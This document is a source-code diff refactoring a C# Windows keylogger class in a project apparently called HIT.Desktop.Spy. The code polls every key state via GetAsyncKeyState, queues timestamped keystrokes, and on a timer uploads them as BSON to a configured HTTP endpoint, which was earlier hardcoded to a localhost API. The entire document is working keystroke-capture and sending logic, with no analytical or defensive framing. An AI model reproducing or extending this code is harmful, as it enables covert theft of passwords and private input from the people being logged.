@@ -1,72 +1,81 @@
 ﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Net.Http;
-using System.Net.Http.Formatting;
-using System.Net.Http.Headers;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using HIT.Common.Extensions;
+using HIT.Services;
 using HIT.Web.ViewModels;
 
 namespace HIT.Desktop.Spy
 {
-    public class Keylogger : IRunnable
+    public class Keylogger : IDataCollector
     {
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(Int32 i);
 
-        private static readonly object syncLock = new object();
-
+        private readonly object SyncLock;
         private readonly string SessionId;
-        private readonly Timer timer;
+        private readonly KeyloggerSettings Settings;
         private readonly ConcurrentQueue<string> KeysPressedQueue;
+        private readonly IHttpService HttpService;
 
-        private bool isRunning = true;
-        
-        public Keylogger(string sessionId)
+        private Timer timer;
+        private bool isRunning;
+
+        public Keylogger(string sessionId, KeyloggerSettings settings, IHttpService httpService)
         {
+            this.Settings = settings;
             this.SessionId = sessionId;
+            this.HttpService = httpService;
             this.KeysPressedQueue = new ConcurrentQueue<string>();
-
-            var dueTime = 2000;
-            var period = 10000;
-            this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
+            this.SyncLock = new object();
         }
 
         public Task Start()
         {
+            this.StartTimer();
+            this.isRunning = true;
+
             while (this.isRunning)
             {
-                for (Int32 i = 0; i < 255; i++)
-                {
-                    var keyState = GetAsyncKeyState(i);
-
-                    if (keyState == 1 || keyState == -32767)
-                    {
-                        var key = (Keys)i;
-
-                        if (key != Keys.LButton && key != Keys.RButton)
-                        {
-                            this.KeysPressedQueue.Enqueue($"[{DateTime.Now}] - {key}");
-                        }
-                    }
-                }
-
+                this.TryEnqueueKeysPressed();
+                
+                // Wait for 10-15 ms to prevent CPU overload
                 Thread.Sleep(10);
             }
 
             return null;
         }
 
-        public async void Stop()
+        private void StartTimer()
         {
-            this.isRunning = false;
-            // TODO await this.Send(this.KeysPressedQueue);
+            this.timer = new Timer(async (_) => { await this.SendKeysPressed(); },
+              this.Settings.TimerSettings.ObjectState,
+              this.Settings.TimerSettings.DueTimeInMilliseconds,
+              this.Settings.TimerSettings.PeriodInMilliseconds);
         }
 
-        private IEnumerable<string> ExtractQueuedItemsFrom(ConcurrentQueue<string> queue)
+        private void TryEnqueueKeysPressed()
+        {
+            for (Int32 i = 0; i < 255; i++)
+            {
+                var keyState = GetAsyncKeyState(i);
+
+                if (keyState == 1 || keyState == -32767)
+                {
+                    var key = (Keys)i;
+
+                    if (key != Keys.LButton && key != Keys.RButton)
+                    {
+                        this.KeysPressedQueue.Enqueue($"[{DateTime.Now}] - {key}");
+                    }
+                }
+            }
+        }
+
+        private IEnumerable<string> ExtractItemsFromQueue(ConcurrentQueue<string> queue)
         {
             var itemsToDequeueCount = queue.Count;
             var itemsDequeued = new List<string>(itemsToDequeueCount);
@@ -86,7 +95,7 @@ namespace HIT.Desktop.Spy
             return itemsDequeued;
         }
 
-        private async Task TimerEventHandler()
+        private async Task SendKeysPressed()
         {
             if (this.KeysPressedQueue.IsNotNull() && this.KeysPressedQueue.Count.IsGreaterThan(0))
             {
@@ -101,22 +110,22 @@ namespace HIT.Desktop.Spy
                  * dequeue items from the queue concurrently, which is not a problem for the queue itself,
                  * but it is a problem for the lists that are be built - 
                  * they will contain chronologically messed up data. */
-                lock (syncLock)
+                lock (this.SyncLock)
                 {
-                    keysToSend = this.ExtractQueuedItemsFrom(this.KeysPressedQueue);
+                    keysToSend = this.ExtractItemsFromQueue(this.KeysPressedQueue);
                 }
 
                 try
                 {
-                    var baseAddress = "http://localhost:62164/";
-                    var requestUri = "api/Sessions/PostKeysPressed";
                     var model = new KeysPressedViewModel
                     {
                         SessionId = this.SessionId,
                         KeysPressed = keysToSend
                     };
 
-                    await this.SendTo(baseAddress, requestUri, model);
+                    await this.HttpService.SendAsBson(model,
+                        this.Settings.HttpServiceSettings.BaseAddress, 
+                        this.Settings.HttpServiceSettings.RequestURL);
                 }
                 catch (Exception exc)
                 {
@@ -125,26 +134,13 @@ namespace HIT.Desktop.Spy
             }
         }
 
-        private async Task SendTo<T>(string baseAddress, string requestUri, T data)
+        public async void Stop()
         {
-            // TODO: Introduce an HttpClientProvider to detach from the HttpClient type
-            // and make the code more testable
-            using (var client = new HttpClient())
-            {
-                // Set the Base address for all request uri's
-                client.BaseAddress = new Uri(baseAddress);
+            // Stops the Start() method from logging any more keys
+            this.isRunning = false;
 
-                // Set the Accept header to ContentType BSON
-                client.DefaultRequestHeaders.Accept.Clear();
-                client.DefaultRequestHeaders.Accept.Add(
-                    new MediaTypeWithQualityHeaderValue("application/bson"));
-
-                // POST using a BSON formatter
-                var bsonFormatter = new BsonMediaTypeFormatter();
-                var result = await client.PostAsync(requestUri, data, bsonFormatter);
-
-                result.EnsureSuccessStatusCode();
-            }
+            // Send the last keys that were pressed
+            await this.SendKeysPressed();
         }
     }
 }
